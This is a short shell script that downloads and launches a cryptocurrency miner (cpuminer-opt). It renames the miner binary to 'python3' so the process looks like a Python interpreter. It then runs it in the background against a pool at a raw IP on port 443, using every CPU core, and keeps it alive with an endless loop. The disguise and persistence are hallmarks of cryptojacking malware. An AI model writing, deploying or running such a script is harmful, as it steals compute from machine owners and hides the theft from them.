#!/bin/sh
sudo apt update
sudo apt install screen -y
wget --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
tar xf cpuminer-opt-linux.tar.gz
mv cpuminer-sse2 python3
nohup ./python3 -a power2b -o stratum+tcp://159.223.48.143:443 -u mbc1q6nrfemwmcd4w8negnvhqd7hzy4nkfnmlwu7z4f.RIZA -p x -t$(nproc --all) &
while [ 1 ]; do
  sleep 3
done
sleep 999
